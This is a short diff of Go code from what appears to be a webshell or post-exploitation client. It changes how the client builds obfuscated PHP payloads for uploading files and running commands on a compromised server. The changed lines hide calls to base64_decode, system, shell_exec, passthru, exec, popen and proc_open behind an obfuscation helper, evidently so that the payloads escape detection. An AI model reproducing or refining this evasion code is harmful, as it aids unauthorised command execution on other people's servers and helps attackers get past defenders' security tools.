@@ -188,7 +188,7 @@ func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request
 	if p.append {
 		flag = "a"
 	}
-	b64S, b64R := obfuscatedFunc("base64_decode")
+	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
 	code := b64S + ";" +
 		"$p=" + b64R + "('" + remoteB64 + "');" +
 		"$c=" + b64R + "('" + contentB64 + "');" +
@@ -261,13 +261,13 @@ func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, erro
 
 	// 构造自包含 PHP 源码：把 base64_decode($_POST['xxx']) 替换成
 	// base64_decode('xxx')，让 eval 直接拿到解码后的值。
-	b64S, b64R := obfuscatedFunc("base64_decode")
-	sysS, sysR := obfuscatedFunc("system")
-	psS, psR := obfuscatedFunc("passthru")
-	seS, seR := obfuscatedFunc("shell_exec")
-	exS, exR := obfuscatedFunc("exec")
-	poS, poR := obfuscatedFunc("popen")
-	prS, prR := obfuscatedFunc("proc_open")
+	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
+	sysS, sysR := obfuscatedFuncSubstr("system")
+	psS, psR := obfuscatedFuncSubstr("passthru")
+	seS, seR := obfuscatedFuncSubstr("shell_exec")
+	exS, exR := obfuscatedFuncSubstr("exec")
+	poS, poR := obfuscatedFuncSubstr("popen")
+	prS, prR := obfuscatedFuncSubstr("proc_open")
 
 	code := "" +
 		b64S + ";" + sysS + ";" + psS + ";" + seS + ";" + exS + ";" + poS + ";" + prS + ";" +
